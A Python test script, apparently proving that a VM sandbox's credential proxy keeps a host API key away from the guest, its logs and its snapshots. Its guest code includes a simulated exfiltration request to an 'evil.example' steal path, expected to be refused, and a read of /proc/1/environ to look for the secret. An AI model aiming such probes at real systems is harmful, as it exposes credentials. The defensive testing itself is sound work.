"""Real TLS upstream and real guest proof for the portable host credential proxy."""

from __future__ import annotations

import argparse
import http.server
import json
import os
import re
import secrets
import ssl
import subprocess
import sys
import threading
from pathlib import Path
from unittest.mock import patch

from .build_constants import BuildConstants
from .common import ScriptError
from .image import ImageCache
from .policy import resolve
from .receipt import verify
from .warm import capture


def run(backend: str, output: Path, timeout: float) -> None:
    output.mkdir(parents=True, exist_ok=True)
    key_value = "nvx-fixture-" + secrets.token_hex(24)
    observed: list[bool] = []

    class Handler(http.server.BaseHTTPRequestHandler):
        def do_GET(self) -> None:
            observed.append(self.headers.get("Authorization") == "Bearer " + key_value)
            self.send_response(200)
            self.end_headers()
            self.wfile.write(key_value.encode())

        def log_message(self, format: str, *args: object) -> None:
            pass

    cert, key = output / "cert.pem", output / "key.pem"
    subprocess.run(
        [
            "openssl",
            "req",
            "-x509",
            "-newkey",
            "rsa:2048",
            "-nodes",
            "-keyout",
            str(key),
            "-out",
            str(cert),
            "-days",
            "1",
            "-subj",
            "/CN=nvx-credential-fixture",
            "-addext",
            "subjectAltName=IP:127.0.0.1",
        ],
        capture_output=True,
        check=True,
    )
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(cert, key)
    collector = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Handler)
    collector.socket = context.wrap_socket(collector.socket, server_side=True)
    thread = threading.Thread(target=collector.serve_forever, daemon=True)
    thread.start()
    scope = f"127.0.0.1:{collector.server_port}"
    code = """import os,http.client,urllib.parse
assert 'NVX_FIXTURE_KEY' not in os.environ
assert b'NVX_FIXTURE_KEY=' not in open('/proc/1/environ','rb').read()
url=urllib.parse.urlsplit(os.environ['NVX_PROXY_URL'])
def request(path):
 c=http.client.HTTPConnection(url.hostname,url.port,timeout=5)
 c.request('GET',path,headers={'X-NVX-Proxy-Capability':os.environ['NVX_PROXY_CAPABILITY'],'Authorization':'guest-supplied-untrusted'})
 r=c.getresponse(); result=(r.status,r.read()); c.close(); return result
assert request('/https/SCOPE/check')==(200,b'[redacted]')
assert request('/https/evil.example:443/steal')[0]==403
print('NVX-SECRET-PROXY-OK')
""".replace("SCOPE", scope)
    cli = [sys.executable, str(BuildConstants.REPO_ROOT / "scripts/nvx.py")]
    try:
        result = subprocess.run(
            [
                *cli,
                "run",
                "--hypervisor",
                backend,
                "--image",
                "python:3.12-slim",
                "--secret",
                "NVX_FIXTURE_KEY",
                "--egress-allow",
                scope,
                "--proxy-ca",
                str(cert.absolute()),
                "--proxy-log",
                str((output / "proxy.jsonl").absolute()),
                "--",
                "python",
                "-c",
                code,
            ],
            capture_output=True,
            timeout=timeout * 3,
            env={**os.environ, "NVX_FIXTURE_KEY": key_value},
        )
        (output / "guest.log").write_bytes(result.stdout + result.stderr)
        if (
            result.returncode
            or result.stdout != b"NVX-SECRET-PROXY-OK\n"
            or observed != [True]
        ):
            raise ScriptError(
                "credential guest/TLS scope proof failed; inspect guest.log"
            )
        match = re.search(rb"NVX-ID: ([0-9a-f]{32})", result.stderr)
        if match is None:
            raise ScriptError("secret run did not publish an instance ID")
        state = ImageCache().root / "instances" / match[1].decode()
        verify(state / "receipt.json")
        for file in state.iterdir():
            if file.is_file() and key_value.encode() in file.read_bytes():
                raise ScriptError("host credential appeared in retained guest evidence")
        if key_value.encode() in (output / "proxy.jsonl").read_bytes():
            raise ScriptError("proxy log contains credential bytes")
        control_code = "import os; assert os.environ['NVX_FIXTURE_KEY'].startswith('nvx-fixture-'); print('NVX-LEGACY-ENV-LEAK')"
        legacy = subprocess.run(
            [
                *cli,
                "run",
                "--hypervisor",
                backend,
                "--image",
                "python:3.12-slim",
                "--env",
                "NVX_FIXTURE_KEY=" + key_value,
                "--",
                "python",
                "-c",
                control_code,
            ],
            capture_output=True,
            timeout=timeout * 3,
        )
        if legacy.returncode or legacy.stdout != b"NVX-LEGACY-ENV-LEAK\n":
            raise ScriptError(
                "legacy environment negative control did not leak to guest"
            )
        protected_snapshot = output / "protected-template"
        legacy_snapshot = output / "legacy-template"
        selected = argparse.Namespace(
            secret=["NVX_FIXTURE_KEY"],
            network_egress_allow=[scope],
            secret_header=[],
            proxy_ca=cert.absolute(),
        )
        with patch.dict(os.environ, {"NVX_FIXTURE_KEY": key_value}):
            capture(
                "python:3.12-slim",
                backend,
                protected_snapshot,
                resolve(),
                timeout=timeout,
                prelude=("python", "-c", code),
                secret_args=selected,
            )
        capture(
            "python:3.12-slim",
            backend,
            legacy_snapshot,
            resolve(),
            timeout=timeout,
            prelude=(
                "/usr/bin/env",
                "NVX_FIXTURE_KEY=" + key_value,
                "/usr/local/bin/python",
                "-c",
                control_code,
            ),
        )

        def contains(path: Path) -> bool:
            needle = key_value.encode()
            previous = b""
            with path.open("rb") as source:
                while chunk := source.read(1 << 20):
                    if needle in previous + chunk:
                        return True
                    previous = chunk[-len(needle) :]
            return False

        protected_files = [
            file for file in protected_snapshot.rglob("*") if file.is_file()
        ]
        if any(contains(file) for file in protected_files):
            raise ScriptError("host credential appeared in protected snapshot bytes")
        if not contains(legacy_snapshot / "snapshot/memory.bin"):
            raise ScriptError(
                "legacy environment snapshot negative control did not leak"
            )
        (output / "proof.json").write_text(
            json.dumps(
                {
                    "upstream_tls": True,
                    "scoped_injection": True,
                    "evil_refused": True,
                    "environment_secret_absent": True,
                    "retained_evidence_secret_absent": True,
                    "legacy_environment_control_leaks": True,
                    "snapshot_secret_absent": True,
                    "legacy_snapshot_control_leaks": True,
                    "snapshot_proxy_state": "excluded; restore requires a fresh host binding",
                },
                sort_keys=True,
            )
            + "\n"
        )
        print("NVX-SECRET-ISOLATION-OK")
    finally:
        collector.shutdown()
        collector.server_close()
        thread.join(timeout=2)
